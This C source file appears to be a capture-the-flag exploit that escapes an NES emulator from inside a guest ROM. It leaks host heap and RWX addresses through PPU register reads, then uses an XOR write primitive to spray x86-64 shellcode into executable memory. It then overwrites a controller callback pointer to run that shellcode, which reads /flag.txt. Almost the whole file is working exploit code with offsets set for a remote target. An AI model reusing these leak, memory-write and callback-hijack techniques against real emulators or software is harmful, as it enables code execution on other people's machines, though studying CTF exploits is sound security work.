#include <stdint.h>

extern void bka(uint8_t a);
extern void bkx(uint8_t a);

#define REMOTE

#define HEAP_LIBC_PAGE 0x4
#define HEAP_LIBC_OFF 0x1E50

#ifdef REMOTE
#define M_RAM_OFF 0x551f0
#define FUNC_OVERWRITE_OFF 0x3EB9D8
#endif
#ifndef REMOTE
#define M_RAM_OFF 0x553e0
#define FUNC_OVERWRITE_OFF 0x3FB108
#endif
#define DREAM_OFF 0xA2D60
#define LD_PAGE 0x1
#define LD_OFF 0x3f0
#define HEAP_OFF 0x3d0
#define RWX_OFF 0x3000
#define LIBC_OFF 0x217000
#define SYSTEM_OFF 0x28670
#define JOYCON_CB_RWX_DIFF 0x62D79
#define SHELLCODE_SZ 0x4a
#define SPRAY_CNT 3

enum IORegisters
{
    PPUCTRL = 0x2000,
    PPUMASK,
    PPUSTATUS,
    OAMADDR,
    OAMDATA,
    PPUSCROL,
    PPUADDR,
    PPUDATA,
    OAMDMA = 0x4014,
    PUTC = 0x4015,
    JOY1 = 0x4016,
    JOY2 = 0x4017,
};

/*[*] 0x30: 0x00007f69a1cdc3e8 0x00007ffe928407e0
[*] 0x40: 0x000000010000000b 0x0000000000000000
[*] 0x50: 0x00007ffe92840610 0x0000000000000000
[*] 0x60: 0x00007f69a1cb26b4 0x00007f69a1cb268d
*/
/*
0000000000000000 <_start>:
   0:   48 31 d2                xor    %rdx,%rdx
   3:   48 31 c0                xor    %rax,%rax
   6:   48 31 f6                xor    %rsi,%rsi
   9:   48 bb 6c 6f 6c 6c 6f    movabs $0x746c6c6f6c6c6f6c,%rbx
  10:   6c 6c 74
  13:   48 c1 eb 38             shr    $0x38,%rbx
  17:   53                      push   %rbx
  18:   48 bb 2f 66 6c 61 67    movabs $0x78742e67616c662f,%rbx
  1f:   2e 74 78
  22:   53                      push   %rbx
  23:   48 89 e7                mov    %rsp,%rdi
  26:   b0 02                   mov    $0x2,%al
  28:   0f 05                   syscall
  2a:   48 89 c7                mov    %rax,%rdi
  2d:   48 31 c0                xor    %rax,%rax
  30:   48 89 e6                mov    %rsp,%rsi
  33:   ba 00 01 00 00          mov    $0x100,%edx
  38:   0f 05                   syscall
  3a:   48 89 c2                mov    %rax,%rdx
  3d:   b8 01 00 00 00          mov    $0x1,%eax
  42:   bf 01 00 00 00          mov    $0x1,%edi
  47:   0f 05                   syscall
*/
//aligned to 0x10, necessary
uint8_t shellcode[] = { 0x90,
    0x48,0x31,0xd2,0x48,0x31,0xc0,0x48,0x31,
    0xf6,0x48,0xbb,0x6c,0x6f,0x6c,0x6c,0x6f,
    0x6c,0x6c,0x74,0x48,0xc1,0xeb,0x38,0x53,
    0x48,0xbb,0x2f,0x66,0x6c,0x61,0x67,0x2e,
    0x74,0x78,0x53,0x48,0x89,0xe7,0xb0,0x02,
    0x0f,0x05,0x48,0x89,0xc7,0x48,0x31,0xc0,
    0x48,0x89,0xe6,0xba,0x00,0x01,0x00,0x00,
    0x0f,0x05,0x48,0x89,0xc2,0xb8,0x01,0x00,
    0x00,0x00,0xbf,0x01,0x00,0x00,0x00,0x0f,
    0x05,0x00,0x00,0x00,0x00,0x00,0x00,};

uint8_t pattern[] = {0x64,0x4c,0x8b,0x1c,0x25,0x28,0xff,0xff,0xff,0x41,0xff,0xa3,0x18,0x3c,0x00,0x00}; //the bytes found in libc

void reset() {
  //bka(0); bka(0); bka(0); bka(0);
  bka(0); bka(0); bka(0); bka(0);
}

void sub64(uint32_t al, uint32_t ah, uint32_t bl, uint32_t bh,
           uint32_t *xl, uint32_t *xh) {
  *xl = al - bl;
  if (al < bl) {
    *xh = ah - bh - 1;
  } else {
    *xh = ah - bh;
  }
}

void xorAt64(uint32_t ofs_low, uint32_t ofs_high, uint8_t value) {
  int i;
  for (i = 0; i < 4; i++) bka((ofs_high >> ((3-i)*8)) & 0xff);
  for (i = 0; i < 4; i++) bka((ofs_low >> ((3-i)*8)) & 0xff);
  bkx(value);
  reset();
}

void xorAt(uint32_t offset, uint8_t value) {
  int i;
  for (i = 0; i < 4; i++) bka((offset >> ((3-i)*8)) & 0xff);
  bkx(value);
  reset();
}

void putchar(uint8_t c) {
  *(uint8_t*)(0x4015) = c;
}

uint8_t get_data(uint16_t addr){
    uint8_t a = (addr >> 8) & 0xff, b = addr &0xff;
    *(uint8_t*)(PPUADDR) = a;
    *(uint8_t*)(PPUADDR) = b;
    return *(uint8_t*)PPUDATA;
}


//void set_ppu_data(uint8_t chef){
//    *(uint8_t*)PPUDATA = chef;
//}
//
//uint8_t libc_addr[8];

void leak(uint16_t offset, uint32_t* high, uint32_t* low){
    uint8_t i = 0;
    get_data(0);
    for(i = 0; i < 4; i++)
        *low |= (uint32_t)get_data(offset+i+1)<<(i*8);
    for(i = 0; i < 4; i++)
        *high |= (uint32_t)get_data(offset+i+5)<<(i*8);
    get_data(0);
}

void log64(uint32_t high, uint32_t low){
    uint8_t i = 0;
    putchar(0x46);
    putchar(0x46);
    for(i = 0; i < 4; i++)
        putchar((low >> (i*8)) & 0xFF);
    for(i = 0; i < 4; i++)
        putchar((high >> (i*8)) & 0xFF);
    putchar(0x41);
    putchar(0x42);
    putchar(0x43);
}

void dump(uint32_t base){
    uint8_t i;
    for(i = 0; i < 0xff; i++){
        xorAt(base+i, 0);
    }
    xorAt(base+0xff, 0);
}

void debug(){
    while(1) *(uint8_t*)JOY1 = 1;
}

void redemption(){
    *(uint8_t*)0x9001 = 0x10;
}

int main(void) {
    uint32_t rwx_low, rwx_high;
    uint32_t mram_low, mram_high;
    uint32_t mram_rwx_off_low, mram_rwx_off_high;
    uint32_t joycon_cb_fn_low, overwrite;
    uint8_t i,j;

    //debug();

    //xorAt64(DREAM_OFF+0x1c, 0, LD_PAGE & 0xff);
    redemption();


    rwx_low = rwx_high = 0;
    leak(LD_OFF, &rwx_high, &rwx_low);
    rwx_low -= RWX_OFF;
    rwx_low &= 0xFFFFFF00;

    mram_low = mram_high = 0;
    leak(HEAP_OFF, &mram_high, &mram_low);
    mram_low -= M_RAM_OFF; //set the heap leak to m_RAM

    log64(rwx_high, rwx_low);
    log64(mram_high, mram_low);

    sub64(rwx_low, rwx_high, mram_low, mram_high, &mram_rwx_off_low, &mram_rwx_off_high);
    log64(mram_rwx_off_high, mram_rwx_off_low);

    //prep shellcode with the pattern found at rwx section
    for(i = 0; i < SHELLCODE_SZ; i++)
        shellcode[i] ^= pattern[i%0x10];

    
    //create nop
    for(i = 0; i < 0x10; i++)
        pattern[i] ^= 0x90;

    for(j = 0; j < SPRAY_CNT;j++){
        for(i = 0; i < 0xb0; i++){
            xorAt64(mram_rwx_off_low+i, mram_rwx_off_high, pattern[i%0x10]);
        }
        mram_rwx_off_low+= 0xb0;
            //write shellcode
        for(i = 0; i < SHELLCODE_SZ; i++)
            xorAt64(mram_rwx_off_low+i, mram_rwx_off_high, shellcode[i]);
        mram_rwx_off_low += 0x50;
    }
    mram_rwx_off_low -= SPRAY_CNT*0x100;

    //for finding Mapper allocation on blind remote
#ifdef DUMP
    putchar(0x44);
    putchar(0x44);
    for(i = 0; i < 8; i++)
        dump(FUNC_OVERWRITE_OFF + i*0x100);
    putchar(0x45);
    putchar(0x45);
#endif

    //overwrite callback function
    overwrite = rwx_low;
    joycon_cb_fn_low = rwx_low - JOYCON_CB_RWX_DIFF;
    overwrite ^= joycon_cb_fn_low;
    overwrite |= 0x800;
    for(i = 0; i < 4; i++)
        xorAt64(FUNC_OVERWRITE_OFF+i, 0, (overwrite >> (i*8)) & 0xFF);
    

    putchar(0x47);
    putchar(0x47);
    putchar(0x47);
    putchar(0x47);
    putchar(0x47);
    //trigger
    *(uint8_t*)JOY1 = i;
    while(1);
    return 0;
}
